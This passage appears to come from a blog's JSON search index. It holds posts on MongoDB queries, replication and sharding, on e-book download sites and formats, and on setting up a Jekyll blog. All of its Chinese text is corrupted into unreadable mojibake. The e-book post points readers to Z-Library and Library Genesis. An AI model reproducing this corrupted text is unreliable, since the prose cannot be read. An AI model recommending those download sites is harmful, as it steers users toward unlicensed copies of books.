likes>50 AND (by = 'èœé¸Ÿæ•™ç¨‹' OR title = 'MongoDB æ•™ç¨‹')'\n\n```sql\n>db.col.find({\"likes\": {$gt:50}, $or: [{\"by\": \"èœé¸Ÿæ•™ç¨‹\"},{\"title\": \"MongoDB æ•™ç¨‹\"}]}).pretty()\n```\n\n##### 4. **æ›´æ–°æ–‡æ¡£**\n\n```sql\ndb.collection.update(\n   <query>,\n   <update>,\n   {\n     upsert: <boolean>,\n     multi: <boolean>,\n     writeConcern: <document>\n   }\n)\n\nå‚æ•°è¯´æ˜ï¼š\n  â— query : updateçš„æŸ¥è¯¢æ¡ä»¶ï¼Œç±»ä¼¼sql updateæŸ¥è¯¢å†…whereåé¢çš„ã€‚\n  â— update : updateçš„å¯¹è±¡å’Œä¸€äº›æ›´æ–°çš„æ“ä½œç¬¦ï¼ˆå¦‚$,$inc...ï¼‰ç­‰ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºsql updateæŸ¥è¯¢å†…setåé¢çš„\n  â— upsert : å¯é€‰ï¼Œè¿™ä¸ªå‚æ•°çš„æ„æ€æ˜¯ï¼Œå¦‚æœä¸å­˜åœ¨updateçš„è®°å½•ï¼Œæ˜¯å¦æ’å…¥objNew,trueä¸ºæ’å…¥ï¼Œé»˜è®¤æ˜¯falseï¼Œä¸æ’å…¥ã€‚\n  â— multi : å¯é€‰ï¼Œmongodb é»˜è®¤æ˜¯false,åªæ›´æ–°æ‰¾åˆ°çš„ç¬¬ä¸€æ¡è®°å½•ï¼Œå¦‚æœè¿™ä¸ªå‚æ•°ä¸ºtrue,å°±æŠŠæŒ‰æ¡ä»¶æŸ¥å‡ºæ¥å¤šæ¡è®°å½•å…¨éƒ¨æ›´æ–°ã€‚\n  â— writeConcern :å¯é€‰ï¼ŒæŠ›å‡ºå¼‚å¸¸çš„çº§åˆ«\n```\n\nä¾‹å­:\n\n```sql\ndb.col.insert({\n    title: 'MongoDB æ•™ç¨‹', \n    description: 'MongoDB æ˜¯ä¸€ä¸ª Nosql æ•°æ®åº“',\n    tags: ['mongodb', 'database', 'NoSQL'],\n    likes: 100\n})\n\ndb.col.update({'title':'MongoDB æ•™ç¨‹'},{$set:{'title':'MongoDB'}})\ndb.col.update({'title':'MongoDB æ•™ç¨‹'},{$set:{'title':'MongoDB'}},{multi:true})\n```\n\næ›´å¤šå®ä¾‹:\n\n```sql\nåªæ›´æ–°ç¬¬ä¸€æ¡è®°å½•ï¼š\ndb.col.update( { \"count\" : { $gt : 1 } } , { $set : { \"test2\" : \"OK\"} } );\nå…¨éƒ¨æ›´æ–°ï¼š\ndb.col.update( { \"count\" : { $gt : 3 } } , { $set : { \"test2\" : \"OK\"} },false,true );\nåªæ·»åŠ ç¬¬ä¸€æ¡ï¼š\ndb.col.update( { \"count\" : { $gt : 4 } } , { $set : { \"test5\" : \"OK\"} },true,false );\nå…¨éƒ¨æ·»åŠ åŠ è¿›å»:\ndb.col.update( { \"count\" : { $gt : 5 } } , { $set : { \"test5\" : \"OK\"} },true,true );\nå…¨éƒ¨æ›´æ–°ï¼š\ndb.col.update( { \"count\" : { $gt : 15 } } , { $inc : { \"count\" : 1} },false,true );\nåªæ›´æ–°ç¬¬ä¸€æ¡è®°å½•ï¼š\ndb.col.update( { \"count\" : { $gt : 10 } } , { $inc : { \"count\" : 1} },false,false );\n```\n\n\n\n# 2. ä»‹ç»\n\nMongoDB æ˜¯ä¸€ä¸ªåŸºäº åˆ†å¸ƒå¼æ–‡ä»¶å­˜å‚¨ çš„å¼€æº NoSQL æ•°æ®åº“ç³»ç»Ÿï¼Œç”± C++ ç¼–å†™çš„ã€‚MongoDB æ”¯æŒåˆ†ç‰‡é›†ç¾¤ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ·»åŠ æ›´å¤šçš„èŠ‚ç‚¹ï¼ˆå®ä¾‹ï¼‰ï¼Œè®©é›†ç¾¤å­˜å‚¨æ›´å¤šçš„æ•°æ®ï¼Œå…·å¤‡æ›´å¼ºçš„æ€§èƒ½ã€‚\n\n### 2.1 å­˜å‚¨ç»“æ„\n\nMongoDB çš„å­˜å‚¨ç»“æ„åŒºåˆ«äºä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“ï¼Œä¸»è¦ç”±å¦‚ä¸‹ä¸‰ä¸ªå•å…ƒç»„æˆï¼š\n\n- æ–‡æ¡£ï¼ˆDocumentï¼‰ï¼šMongoDB ä¸­æœ€åŸºæœ¬çš„å•å…ƒï¼Œç”± BSON é”®å€¼å¯¹ï¼ˆkey-valueï¼‰ç»„æˆï¼Œç±»ä¼¼äºå…³ç³»å‹æ•°æ®åº“ä¸­çš„è¡Œï¼ˆRowï¼‰ã€‚\n- é›†åˆï¼ˆCollectionï¼‰ï¼šä¸€ä¸ªé›†åˆå¯ä»¥åŒ…å«å¤šä¸ªæ–‡æ¡£ï¼Œç±»ä¼¼äºå…³ç³»å‹æ•°æ®åº“ä¸­çš„è¡¨ï¼ˆTableï¼‰ã€‚\n- æ•°æ®åº“ï¼ˆDatabaseï¼‰ï¼šä¸€ä¸ªæ•°æ®åº“ä¸­å¯ä»¥åŒ…å«å¤šä¸ªé›†åˆï¼Œå¯ä»¥åœ¨ MongoDB ä¸­åˆ›å»ºå¤šä¸ªæ•°æ®åº“ï¼Œç±»ä¼¼äºå…³ç³»å‹æ•°æ®åº“ä¸­çš„æ•°æ®åº“ï¼ˆDatabaseï¼‰ã€‚\n\n### 2.2 ç‰¹ç‚¹\n\n- **æ•°æ®è®°å½•è¢«å­˜å‚¨ä¸ºæ–‡æ¡£**ï¼šMongoDB ä¸­çš„è®°å½•å°±æ˜¯ä¸€ä¸ª BSON æ–‡æ¡£ï¼Œå®ƒæ˜¯ç”±é”®å€¼å¯¹ç»„æˆçš„æ•°æ®ç»“æ„ï¼Œç±»ä¼¼äº JSON å¯¹è±¡ï¼Œæ˜¯ MongoDB ä¸­çš„åŸºæœ¬æ•°æ®å•å…ƒã€‚\n- **æ¨¡å¼è‡ªç”±**ï¼šé›†åˆçš„æ¦‚å¿µç±»ä¼¼ MySQL é‡Œçš„è¡¨ï¼Œä½†å®ƒä¸éœ€è¦å®šä¹‰ä»»ä½•æ¨¡å¼ï¼Œèƒ½å¤Ÿç”¨æ›´å°‘çš„æ•°æ®å¯¹è±¡è¡¨ç°å¤æ‚çš„é¢†åŸŸæ¨¡å‹å¯¹è±¡ã€‚\n- **æ”¯æŒå¤šç§æŸ¥è¯¢æ–¹å¼**ï¼šMongoDB æŸ¥è¯¢ API æ”¯æŒè¯»å†™æ“ä½œ (CRUD)ä»¥åŠæ•°æ®èšåˆã€æ–‡æœ¬æœç´¢å’Œåœ°ç†ç©ºé—´æŸ¥è¯¢ã€‚\n- **æ”¯æŒ ACID äº‹åŠ¡**ï¼šä¸å…³ç³»å‹æ•°æ®åº“ä¸€æ ·ï¼ŒMongoDB äº‹åŠ¡åŒæ ·å…·æœ‰ ACID ç‰¹æ€§ã€‚MongoDB å•æ–‡æ¡£åŸç”Ÿæ”¯æŒåŸå­æ€§ï¼Œä¹Ÿå…·å¤‡äº‹åŠ¡çš„ç‰¹æ€§ã€‚MongoDB 4.0 åŠ å…¥äº†å¯¹å¤šæ–‡æ¡£äº‹åŠ¡çš„æ”¯æŒï¼Œä½†åªæ”¯æŒå¤åˆ¶é›†éƒ¨ç½²æ¨¡å¼ä¸‹çš„äº‹åŠ¡ï¼Œä¹Ÿå°±æ˜¯è¯´äº‹åŠ¡çš„ä½œç”¨åŸŸé™åˆ¶ä¸ºä¸€ä¸ªå‰¯æœ¬é›†å†…ã€‚MongoDB 4.2 å¼•å…¥äº†åˆ†å¸ƒå¼äº‹åŠ¡ï¼Œå¢åŠ äº†å¯¹åˆ†ç‰‡é›†ç¾¤ä¸Šå¤šæ–‡æ¡£äº‹åŠ¡çš„æ”¯æŒï¼Œå¹¶åˆå¹¶äº†å¯¹å‰¯æœ¬é›†ä¸Šå¤šæ–‡æ¡£äº‹åŠ¡çš„ç°æœ‰æ”¯æŒã€‚\n\n- **é«˜æ•ˆçš„äºŒè¿›åˆ¶å­˜å‚¨**ï¼šå­˜å‚¨åœ¨é›†åˆä¸­çš„æ–‡æ¡£ï¼Œæ˜¯ä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜åœ¨çš„ã€‚é”®ç”¨äºå”¯ä¸€æ ‡è¯†ä¸€ä¸ªæ–‡æ¡£ï¼Œä¸€èˆ¬æ˜¯ ObjectId ç±»å‹ï¼Œå€¼æ˜¯ä»¥ BSON å½¢å¼å­˜åœ¨çš„ã€‚BSON = Binary JSONï¼Œ æ˜¯åœ¨ JSON åŸºç¡€ä¸ŠåŠ äº†ä¸€äº›ç±»å‹åŠå…ƒæ•°æ®æè¿°çš„æ ¼å¼ã€‚\n- **è‡ªå¸¦æ•°æ®å‹ç¼©åŠŸèƒ½**ï¼šå­˜å‚¨åŒæ ·çš„æ•°æ®æ‰€éœ€çš„èµ„æºæ›´å°‘ã€‚\n- **æ”¯æŒ mapreduce**ï¼šé€šè¿‡åˆ†æ²»çš„æ–¹å¼å®Œæˆå¤æ‚çš„èšåˆä»»åŠ¡ã€‚ä¸è¿‡ï¼Œä» MongoDB 5.0 å¼€å§‹ï¼Œmap-reduce å·²ç»ä¸è¢«å®˜æ–¹æ¨èä½¿ç”¨äº†ï¼Œæ›¿ä»£æ–¹æ¡ˆæ˜¯ [èšåˆç®¡é“](https://www.mongodb.com/docs/manual/core/aggregation-pipeline/)ã€‚èšåˆç®¡é“æä¾›æ¯” map-reduce æ›´å¥½çš„æ€§èƒ½å’Œå¯ç”¨æ€§ã€‚\n\n- **æ”¯æŒå¤šç§ç±»å‹çš„ç´¢å¼•**ï¼šMongoDB æ”¯æŒå¤šç§ç±»å‹çš„ç´¢å¼•ï¼ŒåŒ…æ‹¬å•å­—æ®µç´¢å¼•ã€å¤åˆç´¢å¼•ã€å¤šé”®ç´¢å¼•ã€å“ˆå¸Œç´¢å¼•ã€æ–‡æœ¬ç´¢å¼•ã€ åœ°ç†ä½ç½®ç´¢å¼•ç­‰ï¼Œæ¯ç§ç±»å‹çš„ç´¢å¼•æœ‰ä¸åŒçš„ä½¿ç”¨åœºåˆã€‚\n- **æ”¯æŒ failover**ï¼šæä¾›è‡ªåŠ¨æ•…éšœæ¢å¤çš„åŠŸèƒ½ï¼Œä¸»èŠ‚ç‚¹å‘ç”Ÿæ•…éšœæ—¶ï¼Œè‡ªåŠ¨ä»ä»èŠ‚ç‚¹ä¸­é€‰ä¸¾å‡ºä¸€ä¸ªæ–°çš„ä¸»èŠ‚ç‚¹ï¼Œç¡®ä¿é›†ç¾¤çš„æ­£å¸¸ä½¿ç”¨ï¼Œè¿™å¯¹äºå®¢æˆ·ç«¯æ¥è¯´æ˜¯æ— æ„ŸçŸ¥çš„ã€‚\n- **æ”¯æŒåˆ†ç‰‡é›†ç¾¤**ï¼šMongoDB æ”¯æŒé›†ç¾¤è‡ªåŠ¨åˆ‡åˆ†æ•°æ®ï¼Œè®©é›†ç¾¤å­˜å‚¨æ›´å¤šçš„æ•°æ®ï¼Œå…·å¤‡æ›´å¼ºçš„æ€§èƒ½ã€‚åœ¨æ•°æ®æ’å…¥å’Œæ›´æ–°æ—¶ï¼Œèƒ½å¤Ÿè‡ªåŠ¨è·¯ç”±å’Œå­˜å‚¨ã€‚\n- **æ”¯æŒå­˜å‚¨å¤§æ–‡ä»¶**ï¼šMongoDB çš„å•æ–‡æ¡£å­˜å‚¨ç©ºé—´è¦æ±‚ä¸è¶…è¿‡ 16MBã€‚å¯¹äºè¶…è¿‡ 16MB çš„å¤§æ–‡ä»¶ï¼ŒMongoDB æä¾›äº† GridFS æ¥è¿›è¡Œå­˜å‚¨ï¼Œé€šè¿‡ GridFSï¼Œå¯ä»¥å°†å¤§å‹æ•°æ®è¿›è¡Œåˆ†å—å¤„ç†ï¼Œç„¶åå°†è¿™äº›åˆ‡åˆ†åçš„å°æ–‡æ¡£ä¿å­˜åœ¨æ•°æ®åº“ä¸­ã€‚\n\n# 3. é«˜å¯ç”¨\n\n### 3.1 å‰¯æœ¬é›†ç¾¤ï¼ˆå¤åˆ¶ï¼‰\n\nMongoDB çš„å‰¯æœ¬é›†ç¾¤æ˜¯ä¸€ç»„ç»´æŠ¤ç›¸åŒæ•°æ®é›†åˆçš„ mongod è¿›ç¨‹ã€‚\n\nå®¢æˆ·ç«¯è¿æ¥åˆ°æ•´ä¸ª Mongodb å¤åˆ¶é›†ç¾¤ï¼Œä¸»èŠ‚ç‚¹æœºè´Ÿè´£æ•´ä¸ªå¤åˆ¶é›†ç¾¤çš„å†™ï¼Œä»èŠ‚ç‚¹å¯ä»¥è¿›è¡Œè¯»æ“ä½œï¼Œä½†é»˜è®¤è¿˜æ˜¯ä¸»èŠ‚ç‚¹è´Ÿè´£æ•´ä¸ªå¤åˆ¶é›†ç¾¤çš„è¯»ã€‚ä¸»èŠ‚ç‚¹å‘ç”Ÿæ•…éšœæ—¶ï¼Œè‡ªåŠ¨ä»ä»èŠ‚ç‚¹ä¸­é€‰ä¸¾å‡ºä¸€ä¸ªæ–°çš„ä¸»èŠ‚ç‚¹ï¼Œç¡®ä¿é›†ç¾¤çš„æ­£å¸¸ä½¿ç”¨ï¼Œè¿™å¯¹äºå®¢æˆ·ç«¯æ¥è¯´æ˜¯æ— æ„ŸçŸ¥çš„ã€‚\n\né€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ªå¤åˆ¶é›†ç¾¤åŒ…å« 1 ä¸ªä¸»èŠ‚ç‚¹ï¼ˆPrimaryï¼‰ï¼Œå¤šä¸ªä»èŠ‚ç‚¹ï¼ˆSecondaryï¼‰ä»¥åŠé›¶ä¸ªæˆ– 1 ä¸ªä»²è£èŠ‚ç‚¹ï¼ˆArbiterï¼‰ã€‚\n\n- **ä¸»èŠ‚ç‚¹**ï¼šæ•´ä¸ªé›†ç¾¤çš„å†™æ“ä½œå…¥å£ï¼Œæ¥æ”¶æ‰€æœ‰çš„å†™æ“ä½œï¼Œå¹¶å°†é›†åˆæ‰€æœ‰çš„å˜åŒ–è®°å½•åˆ°æ“ä½œæ—¥å¿—ä¸­ï¼Œå³ oplogã€‚ä¸»èŠ‚ç‚¹æŒ‚æ‰ä¹‹åä¼šè‡ªåŠ¨é€‰å‡ºæ–°çš„ä¸»èŠ‚ç‚¹ã€‚\n- **ä»èŠ‚ç‚¹**ï¼šä»ä¸»èŠ‚ç‚¹åŒæ­¥æ•°æ®ï¼Œåœ¨ä¸»èŠ‚ç‚¹æŒ‚æ‰ä¹‹åé€‰ä¸¾æ–°èŠ‚ç‚¹ã€‚ä¸è¿‡ï¼Œä»èŠ‚ç‚¹å¯ä»¥é…ç½®æˆ 0 ä¼˜å…ˆçº§ï¼Œé˜»æ­¢å®ƒåœ¨é€‰ä¸¾ä¸­æˆä¸ºä¸»èŠ‚ç‚¹ã€‚\n- **ä»²è£èŠ‚ç‚¹**ï¼šè¿™ä¸ªæ˜¯ä¸ºäº†èŠ‚çº¦èµ„æºæˆ–è€…å¤šæœºæˆ¿å®¹ç¾ç”¨ï¼Œåªè´Ÿè´£ä¸»èŠ‚ç‚¹é€‰ä¸¾æ—¶æŠ•ç¥¨ä¸å­˜æ•°æ®ï¼Œä¿è¯èƒ½æœ‰èŠ‚ç‚¹è·å¾—å¤šæ•°èµæˆç¥¨ã€‚\n\n### 3.2 åˆ†ç‰‡é›†ç¾¤ï¼ˆåˆ†åŒºï¼‰\n\nåˆ†ç‰‡é›†ç¾¤æ˜¯ MongoDB çš„åˆ†å¸ƒå¼ç‰ˆæœ¬ï¼Œç›¸è¾ƒå‰¯æœ¬é›†ï¼Œåˆ†ç‰‡é›†ç¾¤æ•°æ®è¢«å‡è¡¡çš„åˆ†å¸ƒåœ¨ä¸åŒåˆ†ç‰‡ä¸­ï¼Œ ä¸ä»…å¤§å¹…æå‡äº†æ•´ä¸ªé›†ç¾¤çš„æ•°æ®å®¹é‡ä¸Šé™ï¼Œä¹Ÿå°†è¯»å†™çš„å‹åŠ›åˆ†æ•£åˆ°ä¸åŒåˆ†ç‰‡ï¼Œä»¥è§£å†³å‰¯æœ¬é›†æ€§èƒ½ç“¶é¢ˆçš„éš¾é¢˜ã€‚\n\nç±»ä¼¼äº Redis Clusterï¼ŒMongoDB ä¹Ÿå¯ä»¥é€šè¿‡åˆ†ç‰‡å®ç° æ°´å¹³æ‰©å±• ã€‚æ°´å¹³æ‰©å±•è¿™ç§æ–¹å¼æ›´çµæ´»ï¼Œå¯ä»¥æ»¡è¶³æ›´å¤§æ•°æ®é‡çš„å­˜å‚¨éœ€æ±‚ï¼Œæ”¯æŒæ›´é«˜ååé‡ã€‚å¹¶ä¸”ï¼Œæ°´å¹³æ‰©å±•æ‰€éœ€çš„æ•´ä½“æˆæœ¬æ›´ä½ï¼Œä»…ä»…éœ€è¦ç›¸å¯¹è¾ƒä½é…ç½®çš„å•æœºæœåŠ¡å™¨å³å¯ï¼Œä»£ä»·æ˜¯å¢åŠ äº†éƒ¨ç½²çš„åŸºç¡€è®¾æ–½å’Œç»´æŠ¤çš„å¤æ‚æ€§ã€‚\n\n##### 1. åˆ†ç‰‡ç­–ç•¥\n\n+ åŸºäºèŒƒå›´çš„åˆ†ç‰‡\n\n  MongoDB æŒ‰ç…§åˆ†ç‰‡é”®ï¼ˆShard Keyï¼‰çš„å€¼çš„èŒƒå›´å°†æ•°æ®æ‹†åˆ†ä¸ºä¸åŒçš„å—ï¼ˆChunkï¼‰ï¼Œæ¯ä¸ªå—åŒ…å«äº†ä¸€æ®µèŒƒå›´å†…çš„æ•°æ®ã€‚å½“åˆ†ç‰‡é”®çš„åŸºæ•°å¤§ã€é¢‘ç‡ä½ä¸”å€¼éå•è°ƒå˜æ›´æ—¶ï¼ŒèŒƒå›´åˆ†ç‰‡æ›´é«˜æ•ˆã€‚\n\n+ åŸºäº Hash å€¼çš„åˆ†ç‰‡\n\n  MongoDB è®¡ç®—å•ä¸ªå­—æ®µçš„å“ˆå¸Œå€¼ä½œä¸ºç´¢å¼•å€¼ï¼Œå¹¶ä»¥å“ˆå¸Œå€¼çš„èŒƒå›´å°†æ•°æ®æ‹†åˆ†ä¸ºä¸åŒçš„å—ï¼ˆChunkï¼‰ã€‚\n\n##### 2. åˆ†ç‰‡æ•°æ®å¦‚ä½•å­˜å‚¨ï¼Ÿ\n\né»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ª Chunk çš„æœ€å¤§å€¼é»˜è®¤ä¸º 64MBï¼ˆå¯è°ƒæ•´ï¼Œå–å€¼èŒƒå›´ä¸º 1~1024 MBã€‚å¦‚æ— ç‰¹æ®Šéœ€æ±‚ï¼Œå»ºè®®ä¿æŒé»˜è®¤å€¼ï¼‰ï¼Œè¿›è¡Œæ•°æ®æ’å…¥ã€æ›´æ–°ã€åˆ é™¤æ—¶ï¼Œå¦‚æœæ­¤æ—¶ Mongos æ„ŸçŸ¥åˆ°äº†ç›®æ ‡ Chunk çš„å¤§å°æˆ–è€…å…¶ä¸­çš„æ•°æ®é‡è¶…è¿‡ä¸Šé™ï¼Œåˆ™ä¼šè§¦å‘ Chunk åˆ†è£‚ã€‚\n\néšç€æ•°æ®æ’å…¥ï¼Œå¯¼è‡´ Chunk åˆ†è£‚ï¼Œè®© AB ä¸¤ä¸ªåˆ†ç‰‡æœ‰ 3 ä¸ª Chunkï¼ŒC åˆ†ç‰‡åªæœ‰ä¸€ä¸ªï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šæŠŠ B åˆ†é…çš„è¿ç§»ä¸€ä¸ªåˆ° C åˆ†ç‰‡å®ç°é›†ç¾¤æ•°æ®å‡è¡¡ã€‚\n\n# 4. å¤´è„‘é£æš´\n\n### 4.1 æ˜¯bæ ‘è¿˜æ˜¯b+æ ‘\n\n`MongoDB indexes use a B-tree data structure.`\n\næœ‰äººçœ‹åˆ°å®˜æ–¹æ–‡æ¡£ä¸­çš„è¿™ä¹ˆä¸€å¥ï¼Œå°±ä»¥ä¸º MongoDB åº•å±‚ä½¿ç”¨çš„æ˜¯ç‹­ä¹‰ä¸Šçš„ B æ ‘ã€‚ä½†å®é™…ä¸Š MongoDB åº•å±‚ç”¨çš„æ˜¯ B+ æ ‘ï¼Œæ–‡æ¡£ä¸­ B-tree åº”è¯¥ç†è§£ä¸ºå¹¿ä¹‰ä¸Šçš„ B æ ‘ã€‚\n\nMongoDB ä» 3.2 å¼€å§‹å°±é»˜è®¤ä½¿ç”¨ WiredTiger ä½œä¸ºå­˜å‚¨å¼•æ“ï¼Œæ‰€ä»¥ MongoDB å†…éƒ¨å­˜å‚¨çš„æ•°æ®ç»“æ„ç”± WiredTiger å†³å®šã€‚è€Œ WiredTiger å®˜æ–¹æ–‡æ¡£æ˜ç¡®è¯´äº†åº•å±‚ç”¨çš„ B+ æ ‘ã€‚\n\n\n\n# 5. å‚è€ƒæ–‡æ¡£\n\n+ https://zhuanlan.zhihu.com/p/519658576","tags":["sql"],"categories":["æ•°æ®åº“"]},{"title":"ç”µå­ä¹¦ä¸‹è½½å’Œé˜…è¯»æ–¹å¼","url":"%2Fp%2F43c75d15.html","content":"\nä¹¦ç±æ˜¯äººç±»è¿›æ­¥çš„é˜¶æ¢¯ï¼Œæœ‰äº›ä¹¦é€šè¿‡ç”µå­ä¹¦æ¥é˜…è¯»æ›´æ–¹ä¾¿ã€‚\n\n<!-- more -->\n\n# 1. ä¹¦ç±ä¸‹è½½\n\n### 1.1 Z-Library\n\n+ https://singlelogin.me ï¼ˆå»æ‰¾ç”µæŠ¥æœºå™¨äººï¼‰\n\n### 1.2 åˆ›ä¸–çºªå›¾ä¹¦é¦†\n\nhttp://libgen.is/\n\n### 1.3 å…¶ä»–\n\n+ https://www.book123.info/ æ— åå›¾ä¹¦\n\n- https://www.ershu.org/ å°”ä¹¦ç½‘\n- https://www.zhishikoo.com/ çŸ¥è¯†åº“\n- https://www.jiumodiary.com/ é¸ æ‘©æœç´¢\n- https://lorefree.com/ å»ä¸­å¿ƒåŒ–çŸ¥è¯†å…±äº«ç¤¾åŒº\n\n\n\n# 2. è¯»ä¹¦è½¯ä»¶\n\n### 2.1 ios \n\n+ å¤šçœ‹é˜…è¯»\n\nâ€‹\tæœ‰æ—¶å€™ä¹¦æ¶æœ¬åœ°ä¹¦ç‚¹ä¸åŠ¨ï¼Œéœ€è¦å¼€ä¸‹æµé‡ï¼ˆä¸è¦æŒ‚ä»£ç†ï¼‰ï¼Œå†ç‚¹ã€‚\n\n### 2.2 mac \n\n+ ~~ClearviewX~~\n\n+ ~~ebook-viewer/calibreè‡ªå¸¦ã€‚~~\n\n<img src=\"%E7%94%B5%E5%AD%90%E4%B9%A6%E4%B8%8B%E8%BD%BD%E5%92%8C%E9%98%85%E8%AF%BB%E6%96%B9%E5%BC%8F/1.jpg\" alt=\"1\" style=\"zoom:50%;\" />\n<img src=\"%E7%94%B5%E5%AD%90%E4%B9%A6%E4%B8%8B%E8%BD%BD%E5%92%8C%E9%98%85%E8%AF%BB%E6%96%B9%E5%BC%8F/2.jpg\" alt=\"2\" style=\"zoom:50%;\" />\n<img src=\"%E7%94%B5%E5%AD%90%E4%B9%A6%E4%B8%8B%E8%BD%BD%E5%92%8C%E9%98%85%E8%AF%BB%E6%96%B9%E5%BC%8F/3.jpg\" alt=\"3\" style=\"zoom:50%;\" />\n\n+ å¾®ä¿¡è¯»ä¹¦\n\n\n\n# 3. æ ¼å¼\n\n### 3.1 pdf\n\nPDF(Portable Document Format)æ˜¯æœ€å¸¸è§çš„ç”µå­ä¹¦æ ¼å¼ä¹‹ä¸€ã€‚å®ƒç”±Adobeä¸»å¯¼ã€‚ç”¨äºPDFåˆ›å»ºå’Œæ’ç‰ˆçš„è½¯ä»¶éå¸¸ä¸“ä¸šå’Œå®ç”¨ã€‚ PDFæ ¼å¼çš„ç”µå­ä¹¦å¾ˆå®¹æ˜“åœ¨ç½‘ç»œä¸Šæ‰¾åˆ°ã€‚è®¸å¤šå­¦æœ¯èµ„æ–™ä»…é‡‡ç”¨PDFæ ¼å¼ï¼Œå‡ ä¹æ‰€æœ‰å¹³å°éƒ½æ”¯æŒè¯»å–PDFæ–‡ä»¶ã€‚\n\nä¼˜ç‚¹ï¼šæä¾›æœ€å¥½çš„æ’ç‰ˆæ•ˆæœã€ä»åˆ›å»ºåˆ°æµè§ˆéƒ½æœ‰ä¸€å¤§æ‰¹è½¯ç¡¬ä»¶æä¾›æ”¯æŒ\nç¼ºç‚¹ï¼šåœ¨å°å±ä¸Šä½“éªŒä¸ä½³ï¼Œéœ€è¦é¢‘ç¹ç¼©æ”¾æ‹–åŠ¨ï¼ˆä¿è¯æ–‡æ¡£é«˜è¿˜åŸåº¦çš„ä»£å¿ï¼‰\n\n\n\n### 3.2 epub\n\nepubæ ¼å¼ç”µå­ä¹¦æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯é€šç”¨æ€§å¼ºï¼Œæ˜¯ç›®å‰æ”¯æŒé˜…è¯»è½¯ä»¶æœ€å¤šçš„ç”µå­ä¹¦ï¼ˆæ¯”å¦‚æµè§ˆå™¨ã€åŸºæœ¬é™¤äº†Kindle APPä»¥å¤–çš„æ‰€æœ‰é˜…è¯»APPéƒ½æ”¯æŒï¼‰ã€‚\n\né™¤æ­¤ä¹‹å¤–ï¼Œepub æ ¼å¼å¯¹äºå¤æ‚çš„æ’ç‰ˆï¼Œå›¾è¡¨ï¼Œå…¬å¼ç­‰å…ƒç´ çš„å…¼å®¹æ€§æ¯”mobiæ ¼å¼è¦å¥½ã€‚ç›®å‰epubæ ¼å¼çš„ä¼˜åŠ¿ä¸»è¦ä½“ç°åœ¨å›¾æ–‡æ··æ’ã€å›¾ç‰‡åµŒå…¥å­—ä½“ä¸Šï¼Œæœªæ¥å¯é¢„æµ‹çš„ä¼˜åŠ¿æ˜¯epubæ ¼å¼å°†ä¼šæ”¯æŒå£°éŸ³ã€å½±åƒç­‰å¤šåª’ä½“å†…å®¹ï¼ˆæ¥è‡ªç»´åŸºç™¾ç§‘ï¼‰ã€‚\n\nä¼˜ç‚¹ï¼šä½“ç§¯ç›¸å¯¹pdfè¦å°ï¼›å¯¹é˜…è¯»è®¾å¤‡çš„æ€§èƒ½è¦æ±‚è¾ƒä½ï¼›å¯¹å°å±è®¾å¤‡å‹å¥½\nç¼ºç‚¹ï¼šæ— æ˜æ˜¾ç¼ºç‚¹\n\n\n\n### 3.3 mobi\n\n mobiæ˜¯Amazonç”µå­ä¹¦çš„ä¸“æœ‰æ ¼å¼ï¼Œmobiè·Ÿepubè¡¨ç°æ— é™æ¥è¿‘ã€‚\n\n\n\n### 3.4 azw3\n\nç›®å‰ä» Amazonè´­ä¹°çš„ä¹¦ï¼Œå¤§éƒ¨åˆ†å·²ç»æ˜¯azw3æ ¼å¼äº†ï¼Œè€Œä»¥å‰ä¸»æµçš„mobiæ ¼å¼åˆ™è¶Šæ¥è¶Šå°‘ï¼Œå®ƒæ­£é€æ¸å–ä»£mobiæˆä¸ºKindleç”µå­ä¹¦çš„ä¸»æµæ ¼å¼ã€‚\n\nazwæ ¼å¼æ˜¯Amazonçš„ä¸“æœ‰æ ¼å¼ï¼Œå› æ­¤å®ƒåœ¨ç”µå­é˜…è¯»å™¨ä¸­ä¸åƒEPUBå’ŒMOBIæ ¼å¼é‚£æ ·å¾—åˆ°å¹¿æ³›æ”¯æŒã€‚æ‰€æœ‰Amazon Kindleäº§å“éƒ½å¯ä»¥è¯»å–azwæ ¼å¼ï¼Œä½†æ˜¯æ‚¨æ— æ³•åœ¨å…¶ä»–æµè¡Œçš„è®¾å¤‡ï¼ˆä¾‹å¦‚Nookå’ŒKoboç”µå­é˜…è¯»å™¨ï¼‰ä¸­è¯»å–azwæ ¼å¼ã€‚ azwæ–‡ä»¶å¯ä»¥å­˜å‚¨å¤æ‚çš„å†…å®¹ï¼Œä¾‹å¦‚ä¹¦ç­¾ï¼Œæ³¨é‡Šå’Œçªå‡ºæ˜¾ç¤ºã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://he.coffee/ebooks/ebook-format/\n\n","tags":["ç”µå­ä¹¦"],"categories":["è¯»ä¹¦"]},{"title":"jekyllæ­å»ºåšå®¢","url":"%2Fp%2F139d19f4.html","content":"\n# 1. å®‰è£…ä½¿ç”¨\n\n```bash\nsudo gem install jekyll\n```\n\næœ¬æ¥ä»¥ä¸º`jekyll`æ˜¯æœ€ç®€å•éƒ¨ç½²çš„, å®è·µå‘ç°, ä¸€ç‚¹ä¹Ÿæ²¡å°‘æŠ˜è…¾. \n\n<!-- more -->\n\n### 1.1 æŠ¥é”™\n\n+ requires ruby version >= 2.4.0.\n\n  ```bash\n  brew reinstall ruby\n  echo 'export PATH=\"/usr/local/opt/ruby/bin:$PATH\"' >> ~/.zshrc\n  ```\n\n+ Jekyll - command not found\n\n  ```\n  sudo gem install -n /usr/local/bin jekyll\n  ```\n\n  \n\n### 1.2 æ–°å»º blog\n\n```bash\njekyll new myblog\ncd myblog\njekyll serve # å¯åŠ¨ server\n```\n\n\n\n# 2. ä½¿ç”¨\n\n### 2.1 ç®€å•ä¿®æ”¹ä¸»é¡µ\n\nåœ¨ github åˆ›å»ºå¥½ githubpage\n\n```bash\ngit clone git@github.com:unix2dos/httprun.git\ngit checkout gh-pages\n```\n\n\nä¿®æ”¹ index.md å³å¯\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ 